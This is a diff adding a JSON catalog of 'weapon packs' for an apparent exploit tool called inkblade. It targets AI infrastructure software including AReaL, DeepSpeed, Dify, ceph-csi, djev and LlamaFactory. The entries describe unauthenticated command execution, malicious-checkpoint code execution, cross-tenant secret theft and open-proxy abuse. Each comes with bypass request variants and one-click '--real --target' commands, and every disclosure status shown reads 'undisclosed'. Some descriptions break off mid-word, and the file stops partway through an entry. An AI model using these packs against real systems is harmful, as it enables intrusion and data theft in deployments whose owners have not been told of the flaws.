@@ -1,0 +1,2898 @@
+{
+ "schema": "inkblade-weapon-packs-v1",
+ "generated_at": "2026-10-26T20:20:37+00:00",
+ "entrypoint": "inkblade exploit <id> [--dry-run|--real]",
+ "method": "one module + version-matrix row + >=2 payload variants + deployment verdict",
+ "total": 47,
+ "default_exposed": [
+  "cephcsi-httpserver-go-pprof-exposed-l37-regex",
+  "dify-shellctl-unauth-rce",
+  "djev-open-proxy",
+  "msswift-media-local-read",
+  "sglang-omni-admin-failopen"
+ ],
+ "by_requirement": {
+  "default-exposed": 5,
+  "needs-config": 20,
+  "function-level": 21,
+  "hardware-only": 1
+ },
+ "packs": [
+  {
+   "id": "areal-awex",
+   "component": "areal",
+   "module": "areal-awex-nccl-injection",
+   "surface": "params",
+   "version": "448de52",
+   "affected": "<=2.1.0",
+   "deployment_requirement": "hardware-only",
+   "deployment_evidence": "AReaL AWEX joins an NCCL collective with attacker master_addr/port and needs a GPU/NCCL fabric; not reachable from a CPU-only workload.",
+   "default_exposed": false,
+   "exploit": "arbitrary path torch.save + NCCL join with attacker master_addr/port -> weight/gradient injection",
+   "preconditions": [
+    "AReaL SGLang /awex endpoint reachable",
+    "flat network"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-comm-join-via-rdma",
+     "kind": "params",
+     "request": "入组传输 RDMA 传输变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "transport",
+       "rdma"
+      ]
+     }
+    },
+    {
+     "id": "v2-group-mode",
+     "kind": "params",
+     "request": "AWEX_WU_USE_GROUP=1 分组传输变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "use_group",
+       "1"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit areal-awex --dry-run",
+    "real": "inkblade exploit areal-awex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "areal-dataservice-pickle",
+   "component": "areal",
+   "module": "areal-load-pickle",
+   "surface": "http",
+   "version": "448de52",
+   "affected": "<=2.1.0",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "AReaL dataservice pickle.loads on the request body requires the dataservice port to be exposed by the training deployment.",
+   "default_exposed": false,
+   "exploit": "pickle.load on request body -> marker RCE",
+   "preconditions": [
+    "data-service worker exposed",
+    "port reachable",
+    "attacker can POST job"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /load/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-pct-encode",
+     "kind": "encoding",
+     "request": "POST /%6Coad",
+     "transform": {
+      "op": "pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit areal-dataservice-pickle --dry-run",
+    "real": "inkblade exploit areal-dataservice-pickle --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "areal-unauth-engine-control",
+   "component": "areal",
+   "module": "areal-setenv-engine-rce",
+   "surface": "http",
+   "version": "448de52",
+   "affected": "<=2.1.0（引擎面集群内直达）",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "areal/experimental/proxy_rollout_server.py:445 /set_env + /create_engine have no auth, but the proxy rollout server is an optional AReaL training component.",
+   "default_exposed": false,
+   "exploit": "POST /set_env + /create_engine + /call -> arbitrary module import/class/method -> marker RCE",
+   "preconditions": [
+    "AReaL proxy rollout server exposed",
+    "port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /set_env/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-path-case",
+     "kind": "path",
+     "request": "POST /Set_Env",
+     "transform": {
+      "op": "path_case"
+     }
+    },
+    {
+     "id": "v3-double-pct",
+     "kind": "encoding",
+     "request": "POST /set%5Fenv",
+     "transform": {
+      "op": "double_pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit areal-unauth-engine-control --dry-run",
+    "real": "inkblade exploit areal-unauth-engine-control --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "areal-v2-worker",
+   "component": "areal",
+   "module": "areal-load-pickle",
+   "surface": "http",
+   "version": "448de52",
+   "affected": "<=2.1.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "A malicious .pt is loaded with torch.load(weights_only=False) in the AReaL v2 worker; the attacker must control a checkpoint consumed by training.",
+   "default_exposed": false,
+   "exploit": "malicious .pt -> torch.load(weights_only=False) -> marker RCE",
+   "preconditions": [
+    "v2 worker reachable",
+    "attacker can supply .pt"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /load/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-pct-encode",
+     "kind": "encoding",
+     "request": "POST /%6Coad",
+     "transform": {
+      "op": "pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit areal-v2-worker --dry-run",
+    "real": "inkblade exploit areal-v2-worker --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "cephcsi-httpserver-go-pprof-exposed-l37-regex",
+   "component": "cephcsi",
+   "module": "storage-protocol-csi",
+   "surface": "http",
+   "version": "v3.18.1",
+   "affected": "v3.18.1",
+   "deployment_requirement": "default-exposed",
+   "deployment_evidence": "internal/util/httpserver.go:37 registers pprof on the default CSI metrics mux; cmd/cephcsi.go:255 MetricsIP defaults to 0.0.0.0 with no auth.",
+   "default_exposed": true,
+   "exploit": "Unauthenticated pprof + prometheus metrics ride the same default-mux listener the CSI binary serves; default bind is 0.0.0.0. Dynamic function-level reproduction with the verbatim pinned registration and server functions; impact = cpu/heap profiling (secret extraction surface) reachable without cred",
+   "preconditions": [
+    "cephcsi pod network-reachable on the metrics port (default bind 0.0.0.0)",
+    "profiling enabled via --enableprofiling (registration itself is unconditional in EnableProfiling)"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-http",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-pprof",
+     "kind": "probe",
+     "request": "GET /debug/pprof/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-metrics",
+     "kind": "probe",
+     "request": "GET /metrics",
+     "transform": {
+      "op": "path_dotseg"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit cephcsi-httpserver-go-pprof-exposed-l37-regex --dry-run",
+    "real": "inkblade exploit cephcsi-httpserver-go-pprof-exposed-l37-regex --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "只读侦察",
+    "series": "网络架构"
+   }
+  },
+  {
+   "id": "deepspeed-autoep-unsafe-load",
+   "component": "deepspeed",
+   "module": "deepspeed-checkpoint-rce",
+   "surface": "http",
+   "version": "v0.19.8",
+   "affected": "<0.15.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "DeepSpeed v0.19.8 AutoEP torch.load(weights_only=False) on layer_<n>_expert_<e>_mp_rank_0_model_states.pt checkpoints; local checkpoint path.",
+   "default_exposed": false,
+   "exploit": "malicious layer_<n>_expert_<e>_mp_rank_0_model_states.pt -> torch.load(weights_only=False) -> marker",
+   "preconditions": [
+    "attacker can write an AutoEP checkpoint directory",
+    "victim runs ds_to_universal conversion"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /deepspeed/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-method-alt",
+     "kind": "probe",
+     "request": "PUT /deepspeed/load_checkpoint",
+     "transform": {
+      "op": "method",
+      "arg": "PUT"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit deepspeed-autoep-unsafe-load --dry-run",
+    "real": "inkblade exploit deepspeed-autoep-unsafe-load --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "deepspeed-stage3-py-torch-load-any-l3660-regex",
+   "component": "deepspeed",
+   "module": "deepspeed-checkpoint-rce",
+   "surface": "http",
+   "version": "v0.19.8",
+   "affected": "<0.15.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "deepspeed/runtime/zero/stage3.py:3660 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "Explicit torch.load(weights_only=False) inside the ZeRO-3 universal-checkpoint loader: any actor able to write the checkpoint directory gets pickle code execution when the victim resumes. Reproduced at function level against the verbatim pinned stage3.py; the DeepSpeed package tree is stubbed (no CU",
+   "preconditions": [
+    "attacker can write the ZeRO-3 universal checkpoint directory",
+    "victim resumes training with load_optimizer_states for that checkpoint"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /deepspeed/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-method-alt",
+     "kind": "probe",
+     "request": "PUT /deepspeed/load_checkpoint",
+     "transform": {
+      "op": "method",
+      "arg": "PUT"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit deepspeed-stage3-py-torch-load-any-l3660-regex --dry-run",
+    "real": "inkblade exploit deepspeed-stage3-py-torch-load-any-l3660-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "deepspeed-stage3-py-torch-load-any-l3770-regex",
+   "component": "deepspeed",
+   "module": "deepspeed-checkpoint-rce",
+   "surface": "http",
+   "version": "v0.19.8",
+   "affected": "<0.15.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "deepspeed/runtime/zero/stage3.py:3770 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "Explicit torch.load(weights_only=False) inside the ZeRO-3 universal-checkpoint loader: any actor able to write the checkpoint directory gets pickle code execution when the victim resumes. Reproduced at function level against the verbatim pinned stage3.py; the DeepSpeed package tree is stubbed (no CU",
+   "preconditions": [
+    "attacker can write the ZeRO-3 universal checkpoint directory",
+    "victim resumes training with load_optimizer_states for that checkpoint"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /deepspeed/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-method-alt",
+     "kind": "probe",
+     "request": "PUT /deepspeed/load_checkpoint",
+     "transform": {
+      "op": "method",
+      "arg": "PUT"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit deepspeed-stage3-py-torch-load-any-l3770-regex --dry-run",
+    "real": "inkblade exploit deepspeed-stage3-py-torch-load-any-l3770-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "deepspeed-stage3-py-torch-load-unsafe-l3660-ast",
+   "component": "deepspeed",
+   "module": "deepspeed-checkpoint-rce",
+   "surface": "http",
+   "version": "v0.19.8",
+   "affected": "<0.15.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "deepspeed/runtime/zero/stage3.py:3660 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "Explicit torch.load(weights_only=False) inside the ZeRO-3 universal-checkpoint loader: any actor able to write the checkpoint directory gets pickle code execution when the victim resumes. Reproduced at function level against the verbatim pinned stage3.py; the DeepSpeed package tree is stubbed (no CU",
+   "preconditions": [
+    "attacker can write the ZeRO-3 universal checkpoint directory",
+    "victim resumes training with load_optimizer_states for that checkpoint"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /deepspeed/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-method-alt",
+     "kind": "probe",
+     "request": "PUT /deepspeed/load_checkpoint",
+     "transform": {
+      "op": "method",
+      "arg": "PUT"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit deepspeed-stage3-py-torch-load-unsafe-l3660-ast --dry-run",
+    "real": "inkblade exploit deepspeed-stage3-py-torch-load-unsafe-l3660-ast --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "deepspeed-stage3-py-torch-load-unsafe-l3660-regex",
+   "component": "deepspeed",
+   "module": "deepspeed-checkpoint-rce",
+   "surface": "http",
+   "version": "v0.19.8",
+   "affected": "<0.15.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "deepspeed/runtime/zero/stage3.py:3660 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "Explicit torch.load(weights_only=False) inside the ZeRO-3 universal-checkpoint loader: any actor able to write the checkpoint directory gets pickle code execution when the victim resumes. Reproduced at function level against the verbatim pinned stage3.py; the DeepSpeed package tree is stubbed (no CU",
+   "preconditions": [
+    "attacker can write the ZeRO-3 universal checkpoint directory",
+    "victim resumes training with load_optimizer_states for that checkpoint"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /deepspeed/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-method-alt",
+     "kind": "probe",
+     "request": "PUT /deepspeed/load_checkpoint",
+     "transform": {
+      "op": "method",
+      "arg": "PUT"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit deepspeed-stage3-py-torch-load-unsafe-l3660-regex --dry-run",
+    "real": "inkblade exploit deepspeed-stage3-py-torch-load-unsafe-l3660-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "deepspeed-stage3-py-torch-load-unsafe-l3770-ast",
+   "component": "deepspeed",
+   "module": "deepspeed-checkpoint-rce",
+   "surface": "http",
+   "version": "v0.19.8",
+   "affected": "<0.15.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "deepspeed/runtime/zero/stage3.py:3770 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "Explicit torch.load(weights_only=False) inside the ZeRO-3 universal-checkpoint loader: any actor able to write the checkpoint directory gets pickle code execution when the victim resumes. Reproduced at function level against the verbatim pinned stage3.py; the DeepSpeed package tree is stubbed (no CU",
+   "preconditions": [
+    "attacker can write the ZeRO-3 universal checkpoint directory",
+    "victim resumes training with load_optimizer_states for that checkpoint"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /deepspeed/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-method-alt",
+     "kind": "probe",
+     "request": "PUT /deepspeed/load_checkpoint",
+     "transform": {
+      "op": "method",
+      "arg": "PUT"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit deepspeed-stage3-py-torch-load-unsafe-l3770-ast --dry-run",
+    "real": "inkblade exploit deepspeed-stage3-py-torch-load-unsafe-l3770-ast --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "dify-agent-auth-failopen",
+   "component": "dify",
+   "module": "dify-control-plane-failopen",
+   "surface": "http",
+   "version": "v1.17.1 / bbfac7a",
+   "affected": "<=1.18.0（自部署错配面）",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "Dify agent control plane v1.17.1 accepts missing/wrong Bearer tokens on binding creation; requires the agent service and a tenant binding.",
+   "default_exposed": false,
+   "exploit": "no Bearer -> 201 create binding; wrong Bearer -> 201; host mkdir/rm -rf",
+   "preconditions": [
+    "dify-agent-backend reachable",
+    "token unset/default"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "GET /console/api/apps/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-pct-encode",
+     "kind": "encoding",
+     "request": "GET /console/api/app%73",
+     "transform": {
+      "op": "pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit dify-agent-auth-failopen --dry-run",
+    "real": "inkblade exploit dify-agent-auth-failopen --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "dify-home-snapshot-cross-tenant",
+   "component": "dify",
+   "module": "dify-snapshot-cross-tenant-theft",
+   "surface": "http",
+   "version": "v1.17.1",
+   "affected": "<=1.18.0（对象级授权错配面）",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "Dify v1.17.1 snapshot materialization crosses tenant homes; requires two agent bindings and the snapshot API.",
+   "default_exposed": false,
+   "exploit": "snapshot victim home -> materialize into attacker binding -> read VICTIM-SECRET",
+   "preconditions": [
+    "runtime_backend=local (default)",
+    "victim binding ref known"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-dotseg",
+     "kind": "path",
+     "request": "GET /console/api/./agent-stub/<id>",
+     "transform": {
+      "op": "path_dotseg"
+     }
+    },
+    {
+     "id": "v2-pct-encode",
+     "kind": "encoding",
+     "request": "GET /console/api/agent-%73tub/<id>",
+     "transform": {
+      "op": "pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit dify-home-snapshot-cross-tenant --dry-run",
+    "real": "inkblade exploit dify-home-snapshot-cross-tenant --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "dify-shellctl-unauth-rce",
+   "component": "dify",
+   "module": "dify-local-sandbox-unauth-rce",
+   "surface": "http",
+   "version": "v1.17.1",
+   "affected": "<1.16.1",
+   "deployment_requirement": "default-exposed",
+   "deployment_evidence": "dify-agent/docker/docker-compose.yaml:559 shellctl listens on 0.0.0.0:5004 with no token; POST /v1/jobs/run executes commands and reads tenant homes.",
+   "default_exposed": true,
+   "exploit": "POST /v1/jobs/run without token -> arbitrary command; cwd=/home/dify/victim -> read secrets",
+   "preconditions": [
+    "dify-agent-local-sandbox:1.17.1 running",
+    "port 5004 reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /run/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-header-empty-key",
+     "kind": "encoding",
+     "request": "POST /run + X-Api-Key: 空",
+     "transform": {
+      "op": "header",
+      "arg": [
+       "X-Api-Key",
+       ""
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit dify-shellctl-unauth-rce --dry-run",
+    "real": "inkblade exploit dify-shellctl-unauth-rce --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "dify-stub-jwe-default-key",
+   "component": "dify",
+   "module": "dify-stub-token-forgery",
+   "surface": "http",
+   "version": "v1.17.1",
+   "affected": "<1.17.0",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "A Dify stub JWE token can be forged with the shipped default key; requires the agent-stub service to be deployed.",
+   "default_exposed": false,
+   "exploit": "derive JWE offline -> access /agent-stub/* files/config -> 200",
+   "preconditions": [
+    "stub control plane reachable",
+    "default secret unchanged"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-header-empty-token",
+     "kind": "encoding",
+     "request": "POST 上传 + Authorization: Bearer 空",
+     "transform": {
+      "op": "header",
+      "arg": [
+       "Authorization",
+       "Bearer "
+      ]
+     }
+    },
+    {
+     "id": "v2-path-trailing",
+     "kind": "path",
+     "request": "POST /agent-stub/upload/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit dify-stub-jwe-default-key --dry-run",
+    "real": "inkblade exploit dify-stub-jwe-default-key --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "djev-open-proxy",
+   "component": "djev",
+   "module": "djev-open-proxy",
+   "surface": "http",
+   "version": "e5841cf",
+   "affected": "*",
+   "deployment_requirement": "default-exposed",
+   "deployment_evidence": "djev/structured_server.py do_POST/do_GET serve 0.0.0.0:8011; API_KEY is optional and the GET management routes never check it.",
+   "default_exposed": true,
+   "exploit": "unauthenticated POST /v1/* relayed to upstream vLLM; GET management routes remain unauthenticated with key set",
+   "preconditions": [
+    "djev exposed on 0.0.0.0:8011",
+    "API_KEY unset or attacker uses GET"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-absolute-uri",
+     "kind": "method",
+     "request": "GET http://target/ 绝对 URI 代理式",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "style",
+       "absolute-uri"
+      ]
+     }
+    },
+    {
+     "id": "v2-connect",
+     "kind": "method",
+     "request": "CONNECT 隧道变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "style",
+       "connect"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit djev-open-proxy --dry-run",
+    "real": "inkblade exploit djev-open-proxy --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "llamafactory-checkpoint-py-torch-load-unsafe-l334-ast",
+   "component": "llamafactory",
+   "module": "llamafactory-checkpoint-rce",
+   "surface": "file",
+   "version": "v0.9.5",
+   "affected": "v0.9.5",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "src/llamafactory/v1/core/utils/checkpoint.py:334 torch.load(weights_only=False) on a checkpoint consumed by the local training job.",
+   "default_exposed": false,
+   "exploit": "TrainingCheckpointCoordinator.resume restores the dataloader state via torch.load(weights_only=False) on <ckpt>/dataloader/rank_<n>.pt. Same trust boundary as the rng_state sink: checkpoint write access equals pickle code execution on resume. Reproduced through the real upstream resume() flow (metad",
+   "preconditions": [
+    "attacker can write a LlamaFactory v1 training checkpoint directory",
+    "victim resumes training from that checkpoint (resume_from_checkpoint)"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-rng-state",
+     "kind": "checkpoint",
+     "request": "rng_state.pth torch.load(weights_only=False)",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "rng_state.pth torch.load(weights_only=False)"
+      ]
+     }
+    },
+    {
+     "id": "v2-dataloader-state",
+     "kind": "checkpoint",
+     "request": "trainer_state/dataloader torch.load(weights_only=False)",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "trainer_state/dataloader torch.load(weights_only=False)"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit llamafactory-checkpoint-py-torch-load-unsafe-l334-ast --dry-run",
+    "real": "inkblade exploit llamafactory-checkpoint-py-torch-load-unsafe-l334-ast --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "llamafactory-checkpoint-py-torch-load-unsafe-l334-regex",
+   "component": "llamafactory",
+   "module": "llamafactory-checkpoint-rce",
+   "surface": "file",
+   "version": "v0.9.5",
+   "affected": "v0.9.5",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "src/llamafactory/v1/core/utils/checkpoint.py:334 torch.load(weights_only=False) on a checkpoint consumed by the local training job.",
+   "default_exposed": false,
+   "exploit": "TrainingCheckpointCoordinator.resume restores the dataloader state via torch.load(weights_only=False) on <ckpt>/dataloader/rank_<n>.pt. Same trust boundary as the rng_state sink: checkpoint write access equals pickle code execution on resume. Reproduced through the real upstream resume() flow (metad",
+   "preconditions": [
+    "attacker can write a LlamaFactory v1 training checkpoint directory",
+    "victim resumes training from that checkpoint (resume_from_checkpoint)"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-rng-state",
+     "kind": "checkpoint",
+     "request": "rng_state.pth torch.load(weights_only=False)",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "rng_state.pth torch.load(weights_only=False)"
+      ]
+     }
+    },
+    {
+     "id": "v2-dataloader-state",
+     "kind": "checkpoint",
+     "request": "trainer_state/dataloader torch.load(weights_only=False)",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "trainer_state/dataloader torch.load(weights_only=False)"
+      ]
+     }
+    }
+   ],
+   "one_click": {
